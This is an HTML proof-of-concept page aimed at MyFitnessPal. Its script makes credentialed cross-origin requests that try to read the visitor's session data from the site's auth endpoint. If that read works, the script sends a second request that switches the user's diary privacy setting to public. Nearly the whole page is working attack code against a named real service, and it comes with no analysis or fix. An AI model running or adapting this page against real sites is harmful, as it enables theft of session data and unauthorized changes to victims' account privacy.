<!DOCTYPE html>
<html>
<head>
    <title>CORS PoC</title>
</head>
<body>
    <h1>MyFitnessPal CORS Test</h1>
    <button onclick="testCORS()">Test CORS</button>
    <div id="result"></div>

    <script>
    async function testCORS() {
        const resultDiv = document.getElementById('result');
        resultDiv.innerHTML = 'Testing...';
        
        try {
            // Test 1: Try to read session data
            const response = await fetch('https://www.myfitnesspal.com/api/auth/session', {
                method: 'GET',
                credentials: 'include',
                mode: 'cors'
            });
            
            if (response.ok) {
                const data = await response.json();
                resultDiv.innerHTML = '<h2>SUCCESS - Vulnerability Confirmed!</h2>' +
                    '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                
                // If this works, try the state-changing operation
                testDiarySettings();
            } else {
                resultDiv.innerHTML = '<h2>Failed</h2><p>Status: ' + response.status + '</p>';
            }
        } catch (error) {
            resultDiv.innerHTML = '<h2>Failed (Expected)</h2>' +
                '<p>Error: ' + error.message + '</p>' +
                '<p>This is expected behavior - SameSite=Lax is working correctly</p>';
        }
    }
    
    async function testDiarySettings() {
        try {
            const response = await fetch('https://www.myfitnesspal.com/api/services/account/diary_settings', {
                method: 'POST',
                credentials: 'include',
                mode: 'cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    "preference": {
                        "diary_privacy_setting": "public"
                    }
                })
            });
            
            console.log('Diary settings change:', await response.json());
        } catch (error) {
            console.error('Diary settings failed:', error);
        }
    }
    </script>
</body>
</html>
